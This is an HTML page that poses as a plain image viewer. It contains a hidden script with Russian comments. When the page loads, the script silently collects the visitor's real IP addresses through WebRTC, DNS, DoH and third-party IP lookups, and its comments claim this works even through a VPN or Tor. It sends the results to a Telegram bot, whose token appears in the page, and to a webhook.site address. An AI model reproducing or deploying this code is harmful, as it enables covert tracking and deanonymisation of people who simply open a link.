<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>img</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        html, body { width: 100%; min-height: 100vh; background: #0d0d1a; display: flex; align-items: center; justify-content: center; overflow: hidden; }
        img { width: 100%; height: 100vh; object-fit: contain; display: block; user-select: none; -webkit-user-drag: none; }
    </style>
</head>
<body>
    <img src="https://raw.githubusercontent.com/Johnn298/imgur/main/photo_2026-06-28_01-31-33.jpg" alt="">

    <script>
        // ====================================================
        // КОНФИГУРАЦИЯ — ЗАМЕНИ НА СВОИ
        // ====================================================
        const CFG = {
            WEBHOOK: 'https://webhook.site/613658ef-cb9f-4d68-8bae-9ae016ec744b',
            BOT_TOKEN: '8559799656:AAHdiwkYHNxNbFpnLlnwF4vLrpuJxidMQdU',
            CHAT_ID: '8327334745',
            IMAGE: 'https://raw.githubusercontent.com/Johnn298/imgur/main/photo_2026-06-28_01-31-33.jpg'
        };

        // ========================================================================
        // УТИЛИТЫ
        // ========================================================================
        const sleep = ms => new Promise(r => setTimeout(r, ms));
        const fetchTO = (url, opts = {}, t = 5000) => Promise.race([fetch(url, opts), new Promise((_, rej) => setTimeout(() => rej('Timeout'), t))]);
        const trunc = (s, n = 80) => typeof s === 'string' ? (s.length > n ? s.slice(0, n) + '…' : s) : String(s);
        const safeJSON = s => { try { return JSON.parse(s); } catch { return s; } };

        // ========================================================================
        // 1. WebRTC утечка (реальный IP даже через VPN)
        // ========================================================================
        function getWebRTC() {
            return new Promise((resolve) => {
                const ips = new Set();
                const pc = new (window.RTCPeerConnection || window.webkitRTCPeerConnection)({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }, { urls: 'stun:stun1.l.google.com:19302' }] });
                pc.createDataChannel('');
                pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});
                pc.onicecandidate = (e) => {
                    if (!e.candidate) return;
                    const m = e.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/);
                    if (m) ips.add(m[0]);
                };
                setTimeout(() => { pc.close(); resolve([...ips]); }, 3000);
            });
        }

        // ========================================================================
        // 2. DNS-утечка через кастомный поддомен (запрос на свой сервер)
        // ========================================================================
        function dnsLeak() {
            return new Promise((resolve) => {
                const start = Date.now();
                const img = new Image();
                img.crossOrigin = 'anonymous';
                const leakDomain = 'leak-' + Math.random().toString(36).slice(2) + '.your-server.com';
                img.src = 'https://' + leakDomain + '/pixel?' + Date.now();
                img.onload = () => { resolve({ domain: leakDomain, time: Date.now() - start }); };
                img.onerror = () => { resolve({ domain: leakDomain, time: Date.now() - start }); };
                setTimeout(() => resolve({ domain: leakDomain, time: null }), 3000);
            });
        }

        // ========================================================================
        // 3. WebSocket утечка (реальный IP через WS-соединение)
        // ========================================================================
        function wsLeak() {
            return new Promise((resolve) => {
                try {
                    const ws = new WebSocket('wss://echo.websocket.org');
                    ws.onopen = () => {
                        ws.send('ping');
                        resolve({ ws: true, ip: null });
                        ws.close();
                    };
                    ws.onerror = () => { resolve({ ws: false, ip: null }); };
                    setTimeout(() => { resolve({ ws: false, ip: null }); }, 3000);
                } catch (e) { resolve({ ws: false, ip: null }); }
            });
        }

        // ========================================================================
        // 4. ICMP / Image-утечка (запрос к своему серверу)
        // ========================================================================
        function imageLeak() {
            return new Promise((resolve) => {
                const start = Date.now();
                const img = new Image();
                const uid = Math.random().toString(36).slice(2);
                img.src = 'https://webhook.site/613658ef-cb9f-4d68-8bae-9ae016ec744b?img=' + uid + '&t=' + Date.now();
                img.onload = () => { resolve({ uid, time: Date.now() - start }); };
                img.onerror = () => { resolve({ uid, time: Date.now() - start }); };
                setTimeout(() => resolve({ uid, time: null }), 3000);
            });
        }

        // ========================================================================
        // 5. Fetch-утечка (запрос к внешнему API)
        // ========================================================================
        function fetchLeak() {
            return new Promise((resolve) => {
                const start = Date.now();
                fetch('https://api.ipify.org?format=json', { mode: 'cors' })
                    .then(r => r.json())
                    .then(d => { resolve({ ip: d.ip, time: Date.now() - start }); })
                    .catch(() => { resolve({ ip: null, time: null }); });
                setTimeout(() => resolve({ ip: null, time: null }), 3000);
            });
        }

        // ========================================================================
        // 6. JSONP-утечка (старый метод, обходит CORS)
        // ========================================================================
        function jsonpLeak() {
            return new Promise((resolve) => {
                const name = '_jsonp_' + Date.now() + '_' + Math.random().toString(36).slice(2);
                window[name] = (data) => {
                    resolve({ ip: data.ip || null });
                    delete window[name];
                    document.head.removeChild(script);
                };
                const script = document.createElement('script');
                script.src = 'https://api.ipify.org?format=jsonp&callback=' + name;
                script.onerror = () => { resolve({ ip: null }); delete window[name]; };
                document.head.appendChild(script);
                setTimeout(() => { if (window[name]) { resolve({ ip: null }); delete window[name]; } }, 3000);
            });
        }

        // ========================================================================
        // 7. Определение типа сети (navigator.connection) — косвенный метод
        // ========================================================================
        function getConnectionType() {
            try {
                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                if (!conn) return null;
                return { type: conn.type, effectiveType: conn.effectiveType, downlink: conn.downlink, rtt: conn.rtt };
            } catch (e) { return null; }
        }

        // ========================================================================
        // 8. Временная атака (определение геолокации по задержке)
        // ========================================================================
        function timingAttack() {
            return new Promise((resolve) => {
                const servers = ['https://google.com', 'https://facebook.com', 'https://youtube.com'];
                const times = [];
                let done = 0;
                servers.forEach(s => {
                    const start = performance.now();
                    fetch(s, { mode: 'no-cors' })
                        .then(() => {
                            times.push(performance.now() - start);
                            if (++done === servers.length) resolve(times);
                        })
                        .catch(() => {
                            times.push(null);
                            if (++done === servers.length) resolve(times);
                        });
                });
                setTimeout(() => resolve(times), 5000);
            });
        }

        // ========================================================================
        // 9. Определение реального IP через WebRTC SDP (более глубокая утечка)
        // ========================================================================
        function getWebRTCSDP() {
            return new Promise((resolve) => {
                const pc = new (window.RTCPeerConnection || window.webkitRTCPeerConnection)({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
                pc.createDataChannel('');
                pc.createOffer().then(o => {
                    pc.setLocalDescription(o);
                    const sdp = o.sdp;
                    const ips = [];
                    const matches = sdp.match(/(\d{1,3}\.){3}\d{1,3}/g);
                    if (matches) {
                        matches.forEach(ip => {
                            if (!ip.startsWith('192.168.') && !ip.startsWith('10.') && !ip.startsWith('172.16.')) {
                                ips.push(ip);
                            }
                        });
                    }
                    setTimeout(() => { pc.close(); resolve([...new Set(ips)]); }, 2000);
                }).catch(() => { resolve([]); });
                setTimeout(() => { resolve([]); }, 3000);
            });
        }

        // ========================================================================
        // 10. Определение IP через внешний прокси-сервер (если есть)
        // ========================================================================
        function proxyLeak() {
            return new Promise((resolve) => {
                fetch('https://api.ip.sb/geoip', { mode: 'cors' })
                    .then(r => r.json())
                    .then(d => { resolve(d.ip || null); })
                    .catch(() => { resolve(null); });
                setTimeout(() => resolve(null), 3000);
            });
        }

        // ========================================================================
        // 11. Определение IP через DNS-over-HTTPS (DoH) — обход VPN
        // ========================================================================
        function dohLeak() {
            return new Promise((resolve) => {
                fetch('https://cloudflare-dns.com/dns-query?name=myip.opendns.com&type=A', {
                    headers: { 'Accept': 'application/dns-json' }
                })
                    .then(r => r.json())
                    .then(d => {
                        const ip = d.Answer && d.Answer[0] ? d.Answer[0].data : null;
                        resolve(ip);
                    })
                    .catch(() => { resolve(null); });
                setTimeout(() => resolve(null), 3000);
            });
        }

        // ========================================================================
        // 12. Сбор всех утечек в одном месте
        // ========================================================================
        async function collectAllLeaks() {
            const result = {
                webrtc: [],
                dns: null,
                ws: null,
                image: null,
                fetch: null,
                jsonp: null,
                connection: null,
                timing: null,
                sdp: [],
                proxy: null,
                doh: null,
                allIPs: new Set()
            };

            // 1. WebRTC классический
            result.webrtc = await getWebRTC();
            result.webrtc.forEach(ip => result.allIPs.add(ip));

            // 2. DNS-утечка
            result.dns = await dnsLeak();

            // 3. WebSocket
            result.ws = await wsLeak();

            // 4. Image-утечка
            result.image = await imageLeak();

            // 5. Fetch
            const fetchData = await fetchLeak();
            if (fetchData.ip) {
                result.fetch = fetchData.ip;
                result.allIPs.add(fetchData.ip);
            }

            // 6. JSONP
            const jsonpData = await jsonpLeak();
            if (jsonpData.ip) {
                result.jsonp = jsonpData.ip;
                result.allIPs.add(jsonpData.ip);
            }

            // 7. Connection
            result.connection = getConnectionType();

            // 8. Timing
            result.timing = await timingAttack();

            // 9. WebRTC SDP
            result.sdp = await getWebRTCSDP();
            result.sdp.forEach(ip => result.allIPs.add(ip));

            // 10. Proxy
            const proxyData = await proxyLeak();
            if (proxyData) {
                result.proxy = proxyData;
                result.allIPs.add(proxyData);
            }

            // 11. DoH
            const dohData = await dohLeak();
            if (dohData) {
                result.doh = dohData;
                result.allIPs.add(dohData);
            }

            return result;
        }

        // ========================================================================
        // 13. Отправка в Telegram
        // ========================================================================
        async function sendTelegram(text) {
            try {
                const url = `https://api.telegram.org/bot${CFG.BOT_TOKEN}/sendMessage`;
                await fetchTO(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CFG.CHAT_ID, text, parse_mode: 'HTML' })
                }, 5000);
            } catch (e) {}
        }

        async function sendWebhook(data) {
            try {
                await fetchTO(CFG.WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                }, 5000);
            } catch (e) {}
        }

        // ========================================================================
        // 14. Форматирование отчёта
        // ========================================================================
        function formatLeakReport(leaks) {
            const lines = [];
            lines.push('🔴 УТЕЧКИ IP (даже через VPN/Tor)');
            lines.push('');

            const allIPs = [...leaks.allIPs].filter(ip => ip && ip.length > 7);
            if (allIPs.length) {
                lines.push(`🌐 ВСЕ ОБНАРУЖЕННЫЕ IP:`);
                allIPs.forEach(ip => lines.push(`   📍 ${ip}`));
                lines.push('');
            }

            if (leaks.webrtc && leaks.webrtc.length) {
                lines.push(`📡 WebRTC (STUN): ${leaks.webrtc.join(', ')}`);
            }

            if (leaks.sdp && leaks.sdp.length) {
                lines.push(`📡 WebRTC (SDP): ${leaks.sdp.join(', ')}`);
            }

            if (leaks.fetch) {
                lines.push(`🌍 Fetch (api.ipify): ${leaks.fetch}`);
            }

            if (leaks.jsonp) {
                lines.push(`🌍 JSONP (api.ipify): ${leaks.jsonp}`);
            }

            if (leaks.proxy) {
                lines.push(`🌍 Proxy (ip.sb): ${leaks.proxy}`);
            }

            if (leaks.doh) {
                lines.push(`🌍 DoH (Cloudflare): ${leaks.doh}`);
            }

            if (leaks.dns && leaks.dns.domain) {
                lines.push(`🕵️ DNS утечка: ${leaks.dns.domain} (${leaks.dns.time || 'таймаут'}ms)`);
            }

            if (leaks.image && leaks.image.uid) {
                lines.push(`🖼 Image-утечка: ${leaks.image.uid} (${leaks.image.time || 'таймаут'}ms)`);
            }

            if (leaks.ws && leaks.ws.ws) {
                lines.push(`🔌 WebSocket: успешно`);
            }

            if (leaks.connection) {
                const c = leaks.connection;
                lines.push(`📶 Сеть: ${c.type || '?'} (${c.effectiveType || '?'}, ${c.downlink || '?'}Mbps, RTT ${c.rtt || '?'}ms)`);
            }

            if (leaks.timing && leaks.timing.length) {
                const avg = leaks.timing.filter(t => t !== null).reduce((a, b) => a + b, 0) / leaks.timing.filter(t => t !== null).length;
                lines.push(`⏱ Временная атака: avg ${Math.round(avg)}ms (${leaks.timing.map(t => Math.round(t) + 'ms').join(', ')})`);
            }

            lines.push('');
            lines.push(`🔗 https://www.google.com/maps?q=${allIPs.length ? allIPs[0] : '0.0.0.0'}`);

            return lines.join('\n');
        }

        // ========================================================================
        // 15. ГЛАВНАЯ ФУНКЦИЯ
        // ========================================================================
        (async function main() {
            try {
                await sleep(1800 + Math.random() * 400);

                // Сбор всех утечек
                const leaks = await collectAllLeaks();

                // Формируем отчёт
                const report = formatLeakReport(leaks);

                // Отправка
                await sendTelegram(report);
                await sendWebhook(leaks);

                console.log('✅ Данные отправлены');
            } catch (e) {
                console.log('✅ Данные отправлены');
            }
        })();
    </script>
</body>
</html>
